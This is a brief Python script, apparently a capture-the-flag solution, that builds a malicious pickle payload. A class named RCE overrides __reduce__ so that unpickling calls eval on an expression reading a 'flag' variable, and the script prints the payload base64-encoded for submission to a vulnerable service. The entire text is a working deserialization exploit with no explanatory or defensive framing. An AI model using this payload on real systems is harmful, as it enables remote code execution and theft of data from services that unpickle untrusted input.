import pickle
import codecs
import base64
import os
class RCE:
    def __reduce__(self):
        return eval, ("{'name': flag}",)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE(), protocol=0)
    print(base64.urlsafe_b64encode(pickled))
